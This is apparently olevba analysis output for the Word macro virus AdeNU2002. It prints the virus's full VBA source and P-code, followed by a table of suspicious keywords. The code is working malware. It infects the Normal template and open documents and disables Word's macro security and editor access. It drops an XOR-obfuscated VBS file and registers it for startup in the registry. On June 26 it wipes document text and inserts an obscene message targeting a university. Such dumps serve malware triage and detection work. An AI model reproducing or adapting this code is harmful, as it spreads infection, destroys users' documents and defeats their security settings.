olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Adenu
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Adenu - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AdeNU2002.bas 
in file: Virus.MSWord.Adenu - OLE stream: 'Macros/VBA/AdeNU2002'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub RepAdeNU2002(FileObj, Strng)
    On Error Resume Next
    Dim Cnt
    With FileObj.Add(1)
        .Name = "AdeNU2002"
        .Codemodule.Insertlines 1, Strng
        For Cnt = 1 To .Codemodule.CountOfLines
            If .Codemodule.Lines(Cnt, 1) = Empty Then
               .Codemodule.Deletelines Cnt, 1
            End If
        Next
    End With
End Sub
Function LookForAdeNU2002(MacObj, MAcCnt)
    On Error Resume Next
    Dim MacNme, CodCnt, Cnt
    LookForAdeNU2002 = True
    For Cnt = 1 To MAcCnt
        CodCnt = MacObj.Item(Cnt).Codemodule.CountOfLines
        If MacObj.Item(Cnt).Name = "AdeNU2002" Then
            If CodCnt = 0 Then
                MacObj.Remove (MacObj.Item(Cnt))
            Else
                LookForAdeNU2002 = False
            End If
        Else
            If CodCnt <> 0 Then
                MacObj.Item(Cnt).Codemodule.Deletelines 1, CodCnt
            End If
        End If
    Next
End Function
Sub DoVBS(Cont As Object, Path As String)
    On Error Resume Next
    Dim Code As String, I, Code2
    Code = Cont.Lines(1, Cont.CountOfLines)
    For I = 1 To Len(Code)
        Code2 = Code2 & Chr(Asc(Right(Left(Code, I), 1)) Xor 6)
    Next
    Code2 = "GbcHS = " & Chr(34) & Code2 & Chr(34)
    Open Path For Output As #1
        Print #1, Code2
        Print #1, "For I = 1 to Len(GbcHS)" + Chr(10) + "Code = Code & Chr(Asc(Right(Left(GbcHS, I), 1)) Xor 6)" + Chr(10) + "Next"
        Print #1, "On Error Resume Next" + Chr(10) + "Set MSW = CreateObject(" + Chr(34) + "Word.Application" + Chr(34) + ")" + Chr(10); "Set NTT = MSW.NormalTemplate.VBProject.VBComponents"
        Print #1, "If LookForAdeNU2002(NTT, NTT.Count) Then RepAdeNU2002 NTT, Code : MSW.NormalTemplate.Save" + Chr(10) + "Set NTT = Nothing" + Chr(10) + "MSW.Quit"
        Print #1, Cont.Lines(Cont.ProcStartLine("RepAdeNU2002", 0), Cont.ProcCountLines("RepAdeNU2002", vbext_pk_Proc) + Cont.ProcCountLines("LookForAdeNU2002", 0))
    Close #1
End Sub
Sub AdeNU2002Hide()
    On Error Resume Next
    ShowVisualBasicEditor = False
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(122, 1024)).Disable
    FindKey(BuildKeyCode(119, 1024)).Disable
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = &O1
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With CommandBars("Visual Basic")
        .Visible = False
        .Enabled = False
        .Protection = 8
        .Protection = 1
    End With
    With CommandBars("Tools")
        .Controls("Macro").Enabled = (26 - 26)
        .Controls("Customize...").Enabled = (26 - 26)
        .Controls("Templates and Add-ins...").Enabled = (26 - 26)
    End With
End Sub
Sub AdeNU2002show()
    On Error Resume Next
    Dim Bmsg As String
    If Month(Now) = 6 And Day(Now) = 26 Then
        If Documents.Count = 0 Then Documents.Add
        Bmsg = "MESSAGE TO THE FUCKING PUBLIC" & vbCrLf & vbCrLf
        Cmsg = "Mga walang hiya kayong mga nasa poder ng Ateneo de Naga University, " & _
               "Ang paplastik n'yo mga putang ina n'yo, " & _
               "Kayo'y nagtatago sa kabanalan, mga sato't santita na puro " & _
               "kaplastikan ang alam, Mga akala mo kung sino " & _
               "puro YABANG lang naman, Mga mapoporma hanggang porma lang naman ..." & vbCrLf & vbCrLf
        SigM = "W97M/AdeNU2002" & vbCrLf & _
               "Copyright(C)2002 KALANTURA of AdeNU" & vbCrLf & "Naga City Philippines" & vbCrLf
        With Options
            .CheckGrammarAsYouType = False
            .CheckSpellingAsYouType = False
        End With
        With Selection
            .WholeStory
            .Delete Unit:=1, Count:=1
            .Paragraphs.Alignment = 0
            .Font.Size = 12
            .Font.Bold = True
            .Font.Underline = 6
            .TypeParagraph
            .TypeText Bmsg
            .Font.Bold = False
            .Font.Underline = 0
            .Paragraphs.Alignment = 3
            .TypeParagraph
            .TypeText Cmsg
            .Paragraphs.Alignment = 2
            .TypeText SigM
        End With
        If Right(Left(ActiveDocument.FullName, 3), 2) = ":\" Then ActiveDocument.SaveAs (ActiveDocument.FullName)
    End If
End Sub
Sub AdeNU2002()
' AdeNU2002 Virus
' Copyright(C)2002 KALANTURA
' Libmanan Camarines Sur
' [u2tr4v1023t]
    On Error Resume Next
    Application.EnableCancelKey = 0
    Call AdeNU2002Hide
    Dim MCont As Object, NTemp As Object, ADoct As Object, AdeNU2002Str As String
    Dim GetSys As String * 128, SysPathLen As Long, FileFullName As String
    Set MCont = MacroContainer.VBProject.VBComponents.Item("AdeNU2002").Codemodule
    Set NTemp = NormalTemplate.VBProject.VBComponents
    Set ADoct = ActiveDocument.VBProject.VBComponents
    FileFullName = Left(GetSys, GetSystemDirectory(GetSys, 128)) & "\GbcHS4664.VBS"
    If Dir(FileFullName) = "" Then
        DoVBS MCont, FileFullName
    End If
    If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", "GbcHS4664") <> FileFullName Then
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", "GbcHS4664") = FileFullName
    End If
    AdeNU2002Str = MCont.Lines(1, MCont.CountOfLines)
    If LookForAdeNU2002(NTemp, NTemp.Count) Then
        RepAdeNU2002 NTemp, AdeNU2002Str
        NormalTemplate.Save
    End If
    If LookForAdeNU2002(ADoct, ADoct.Count) Then
        RepAdeNU2002 ADoct, AdeNU2002Str
        If Right(Left(ActiveDocument.FullName, 3), 2) = ":\" Then ActiveDocument.SaveAs (ActiveDocument.FullName)
    End If
    AdeNU2002show
    Application.EnableCancelKey = 1
End Sub
Sub ViewVbCode()
    On Error Resume Next
    Application.Quit
End Sub
Sub AutoExec()
    On Error Resume Next
    AdeNU2002Hide
End Sub
Sub AutoOpen()
    On Error Resume Next
    AdeNU2002
End Sub
Sub AutoClose()
    On Error Resume Next
    AdeNU2002
End Sub
Sub FilePrint()
    On Error Resume Next
    AdeNU2002
    Dialogs(88).Show
End Sub
Sub FileClose()
    On Error Resume Next
    AdeNU2002
    If (ActiveDocument.Saved = False) Then
    ActiveDocument.Close
End Sub
Sub FileSaveAs()
    On Error Resume Next
    AdeNU2002
    Dialogs(84).Show
End Sub
Sub FileSave()
    On Error Resume Next
    AdeNU2002
    ActiveDocument.Save
End Sub
' [AdeNU2002]
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Adenu
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1326 bytes
' Macros/VBA/AdeNU2002 - 16925 bytes
' Line #0:
' 	FuncDefn (Private Declare Function GetSystemDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #1:
' 	FuncDefn (Sub RepAdeNU2002(FileObj, Strng))
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Dim 
' 	VarDefn Cnt
' Line #4:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld FileObj 
' 	ArgsMemLd Add 0x0001 
' 	With 
' Line #5:
' 	LitStr 0x0009 "AdeNU2002"
' 	MemStWith New 
' Line #6:
' 	LitDI2 0x0001 
' 	Ld Strng 
' 	MemLdWith Codemodule 
' 	ArgsMemCall Insertlines 0x0002 
' Line #7:
' 	StartForVariable 
' 	Ld Cnt 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith Codemodule 
' 	MemLd CountOfLines 
' 	For 
' Line #8:
' 	Ld Cnt 
' 	LitDI2 0x0001 
' 	MemLdWith Codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitVarSpecial (Empty)
' 	Eq 
' 	IfBlock 
' Line #9:
' 	Ld Cnt 
' 	LitDI2 0x0001 
' 	MemLdWith Codemodule 
' 	ArgsMemCall Deletelines 0x0002 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	StartForVariable 
' 	Next 
' Line #12:
' 	EndWith 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Function LookForAdeNU2002(MacObj, MAcCnt))
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	Dim 
' 	VarDefn MacNme
' 	VarDefn CodCnt
' 	VarDefn Cnt
' Line #17:
' 	LitVarSpecial (True)
' 	St LookForAdeNU2002 
' Line #18:
' 	StartForVariable 
' 	Ld Cnt 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MAcCnt 
' 	For 
' Line #19:
' 	Ld Cnt 
' 	Ld MacObj 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	MemLd CountOfLines 
' 	St CodCnt 
' Line #20:
' 	Ld Cnt 
' 	Ld MacObj 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "AdeNU2002"
' 	Eq 
' 	IfBlock 
' Line #21:
' 	Ld CodCnt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #22:
' 	Ld Cnt 
' 	Ld MacObj 
' 	ArgsMemLd Item 0x0001 
' 	Paren 
' 	Ld MacObj 
' 	ArgsMemCall Remove 0x0001 
' Line #23:
' 	ElseBlock 
' Line #24:
' 	LitVarSpecial (False)
' 	St LookForAdeNU2002 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	ElseBlock 
' Line #27:
' 	Ld CodCnt 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld CodCnt 
' 	Ld Cnt 
' 	Ld MacObj 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	ArgsMemCall Deletelines 0x0002 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	StartForVariable 
' 	Next 
' Line #32:
' 	EndFunc 
' Line #33:
' 	FuncDefn (Sub DoVBS(Cont As Object, Path As String))
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	Dim 
' 	VarDefn Code (As String)
' 	VarDefn I
' 	VarDefn Code2
' Line #36:
' 	LitDI2 0x0001 
' 	Ld Cont 
' 	MemLd CountOfLines 
' 	Ld Cont 
' 	ArgsMemLd Lines 0x0002 
' 	St Code 
' Line #37:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Code 
' 	FnLen 
' 	For 
' Line #38:
' 	Ld Code2 
' 	Ld Code 
' 	Ld I 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0006 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Code2 
' Line #39:
' 	StartForVariable 
' 	Next 
' Line #40:
' 	LitStr 0x0008 "GbcHS = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Code2 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Code2 
' Line #41:
' 	Ld Path 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Code2 
' 	PrintItemNL 
' Line #43:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "For I = 1 to Len(GbcHS)"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0036 "Code = Code & Chr(Asc(Right(Left(GbcHS, I), 1)) Xor 6)"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "Next"
' 	Add 
' 	PrintItemNL 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0017 "Set MSW = CreateObject("
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "Word.Application"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemSemi 
' 	LitStr 0x0033 "Set NTT = MSW.NormalTemplate.VBProject.VBComponents"
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0059 "If LookForAdeNU2002(NTT, NTT.Count) Then RepAdeNU2002 NTT, Code : MSW.NormalTemplate.Save"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0011 "Set NTT = Nothing"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "MSW.Quit"
' 	Add 
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "RepAdeNU2002"
' 	LitDI2 0x0000 
' 	Ld Cont 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	LitStr 0x000C "RepAdeNU2002"
' 	Ld vbext_pk_Proc 
' 	Ld Cont 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	LitStr 0x0010 "LookForAdeNU2002"
' 	LitDI2 0x0000 
' 	Ld Cont 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	Add 
' 	Ld Cont 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub AdeNU2002Hide())
' Line #50:
' 	OnError (Resume Next) 
' Line #51:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #52:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #53:
' 	LitDI2 0x007A 
' 	LitDI2 0x0400 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #54:
' 	LitDI2 0x0077 
' 	LitDI2 0x0400 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #55:
' 	LitOI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #56:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #57:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #58:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #59:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #60:
' 	EndWith 
' Line #61:
' 	StartWithExpr 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Visible 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith Enabled 
' Line #64:
' 	LitDI2 0x0008 
' 	MemStWith Protection 
' Line #65:
' 	LitDI2 0x0001 
' 	MemStWith Protection 
' Line #66:
' 	EndWith 
' Line #67:
' 	StartWithExpr 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #68:
' 	LitDI2 0x001A 
' 	LitDI2 0x001A 
' 	Sub 
' 	Paren 
' 	LitStr 0x0005 "Macro"
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #69:
' 	LitDI2 0x001A 
' 	LitDI2 0x001A 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "Customize..."
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #70:
' 	LitDI2 0x001A 
' 	LitDI2 0x001A 
' 	Sub 
' 	Paren 
' 	LitStr 0x0018 "Templates and Add-ins..."
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #71:
' 	EndWith 
' Line #72:
' 	EndSub 
' Line #73:
' 	FuncDefn (Sub AdeNU2002show())
' Line #74:
' 	OnError (Resume Next) 
' Line #75:
' 	Dim 
' 	VarDefn Bmsg (As String)
' Line #76:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #77:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' 	EndIf 
' Line #78:
' 	LitStr 0x001D "MESSAGE TO THE FUCKING PUBLIC"
' 	Ld vbCrLf 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	St Bmsg 
' Line #79:
' 	LineCont 0x0010 04 00 0F 00 06 00 0F 00 08 00 0F 00 0A 00 0F 00
' 	LitStr 0x0044 "Mga walang hiya kayong mga nasa poder ng Ateneo de Naga University, "
' 	LitStr 0x0028 "Ang paplastik n'yo mga putang ina n'yo, "
' 	Concat 
' 	LitStr 0x003A "Kayo'y nagtatago sa kabanalan, mga sato't santita na puro "
' 	Concat 
' 	LitStr 0x002D "kaplastikan ang alam, Mga akala mo kung sino "
' 	Concat 
' 	LitStr 0x0043 "puro YABANG lang naman, Mga mapoporma hanggang porma lang naman ..."
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	St Cmsg 
' Line #80:
' 	LineCont 0x0004 06 00 0F 00
' 	LitStr 0x000E "W97M/AdeNU2002"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0023 "Copyright(C)2002 KALANTURA of AdeNU"
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0015 "Naga City Philippines"
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	St SigM 
' Line #81:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #82:
' 	LitVarSpecial (False)
' 	MemStWith CheckGrammarAsYouType 
' Line #83:
' 	LitVarSpecial (False)
' 	MemStWith CheckSpellingAsYouType 
' Line #84:
' 	EndWith 
' Line #85:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #86:
' 	ArgsMemCallWith WholeStory 0x0000 
' Line #87:
' 	LitDI2 0x0001 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	ArgsMemCallWith Delete 0x0002 
' Line #88:
' 	LitDI2 0x0000 
' 	MemLdWith Paragraphs 
' 	MemSt Alignment 
' Line #89:
' 	LitDI2 0x000C 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #90:
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Bold 
' Line #91:
' 	LitDI2 0x0006 
' 	MemLdWith Font 
' 	MemSt Underline 
' Line #92:
' 	ArgsMemCallWith TypeParagraph 0x0000 
' Line #93:
' 	Ld Bmsg 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #94:
' 	LitVarSpecial (False)
' 	MemLdWith Font 
' 	MemSt Bold 
' Line #95:
' 	LitDI2 0x0000 
' 	MemLdWith Font 
' 	MemSt Underline 
' Line #96:
' 	LitDI2 0x0003 
' 	MemLdWith Paragraphs 
' 	MemSt Alignment 
' Line #97:
' 	ArgsMemCallWith TypeParagraph 0x0000 
' Line #98:
' 	Ld Cmsg 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #99:
' 	LitDI2 0x0002 
' 	MemLdWith Paragraphs 
' 	MemSt Alignment 
' Line #100:
' 	Ld SigM 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #101:
' 	EndWith 
' Line #102:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0002 ":\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Sub AdeNU2002())
' Line #106:
' 	QuoteRem 0x0000 0x0010 " AdeNU2002 Virus"
' Line #107:
' 	QuoteRem 0x0000 0x001B " Copyright(C)2002 KALANTURA"
' Line #108:
' 	QuoteRem 0x0000 0x0017 " Libmanan Camarines Sur"
' Line #109:
' 	QuoteRem 0x0000 0x000E " [u2tr4v1023t]"
' Line #110:
' 	OnError (Resume Next) 
' Line #111:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #112:
' 	ArgsCall (Call) AdeNU2002Hide 0x0000 
' Line #113:
' 	Dim 
' 	VarDefn MCont (As Object)
' 	VarDefn NTemp (As Object)
' 	VarDefn ADoct (As Object)
' 	VarDefn AdeNU2002Str (As String)
' Line #114:
' 	Dim 
' 	LitDI2 0x0080 
' 	VarDefn GetSys
' 	VarDefn SysPathLen (As Long)
' 	VarDefn FileFullName (As String)
' Line #115:
' 	SetStmt 
' 	LitStr 0x0009 "AdeNU2002"
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Codemodule 
' 	Set MCont 
' Line #116:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set NTemp 
' Line #117:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set ADoct 
' Line #118:
' 	Ld GetSys 
' 	Ld GetSys 
' 	LitDI2 0x0080 
' 	ArgsLd GetSystemDirectory 0x0002 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x000E "\GbcHS4664.VBS"
' 	Concat 
' 	St FileFullName 
' Line #119:
' 	Ld FileFullName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #120:
' 	Ld MCont 
' 	Ld FileFullName 
' 	ArgsCall DoVBS 0x0002 
' Line #121:
' 	EndIfBlock 
' Line #122:
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"
' 	LitStr 0x0009 "GbcHS4664"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld FileFullName 
' 	Ne 
' 	IfBlock 
' Line #123:
' 	Ld FileFullName 
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"
' 	LitStr 0x0009 "GbcHS4664"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	LitDI2 0x0001 
' 	Ld MCont 
' 	MemLd CountOfLines 
' 	Ld MCont 
' 	ArgsMemLd Lines 0x0002 
' 	St AdeNU2002Str 
' Line #126:
' 	Ld NTemp 
' 	Ld NTemp 
' 	MemLd Count 
' 	ArgsLd LookForAdeNU2002 0x0002 
' 	IfBlock 
' Line #127:
' 	Ld NTemp 
' 	Ld AdeNU2002Str 
' 	ArgsCall RepAdeNU2002 0x0002 
' Line #128:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	Ld ADoct 
' 	Ld ADoct 
' 	MemLd Count 
' 	ArgsLd LookForAdeNU2002 0x0002 
' 	IfBlock 
' Line #131:
' 	Ld ADoct 
' 	Ld AdeNU2002Str 
' 	ArgsCall RepAdeNU2002 0x0002 
' Line #132:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0002 ":\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	ArgsCall AdeNU2002show 0x0000 
' Line #135:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #136:
' 	EndSub 
' Line #137:
' 	FuncDefn (Sub ViewVbCode())
' Line #138:
' 	OnError (Resume Next) 
' Line #139:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #140:
' 	EndSub 
' Line #141:
' 	FuncDefn (Sub AutoExec())
' Line #142:
' 	OnError (Resume Next) 
' Line #143:
' 	ArgsCall AdeNU2002Hide 0x0000 
' Line #144:
' 	EndSub 
' Line #145:
' 	FuncDefn (Sub AutoOpen())
' Line #146:
' 	OnError (Resume Next) 
' Line #147:
' 	ArgsCall AdeNU2002 0x0000 
' Line #148:
' 	EndSub 
' Line #149:
' 	FuncDefn (Sub AutoClose())
' Line #150:
' 	OnError (Resume Next) 
' Line #151:
' 	ArgsCall AdeNU2002 0x0000 
' Line #152:
' 	EndSub 
' Line #153:
' 	FuncDefn (Sub FilePrint())
' Line #154:
' 	OnError (Resume Next) 
' Line #155:
' 	ArgsCall AdeNU2002 0x0000 
' Line #156:
' 	LitDI2 0x0058 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #157:
' 	EndSub 
' Line #158:
' 	FuncDefn (Sub FileClose())
' Line #159:
' 	OnError (Resume Next) 
' Line #160:
' 	ArgsCall AdeNU2002 0x0000 
' Line #161:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #162:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #163:
' 	EndSub 
' Line #164:
' 	FuncDefn (Sub FileSaveAs())
' Line #165:
' 	OnError (Resume Next) 
' Line #166:
' 	ArgsCall AdeNU2002 0x0000 
' Line #167:
' 	LitDI2 0x0054 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #168:
' 	EndSub 
' Line #169:
' 	FuncDefn (Sub FileSave())
' Line #170:
' 	OnError (Resume Next) 
' Line #171:
' 	ArgsCall AdeNU2002 0x0000 
' Line #172:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #173:
' 	EndSub 
' Line #174:
' 	QuoteRem 0x0000 0x000C " [AdeNU2002]"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |GbcHS4664.VBS       |Executable file name                         |
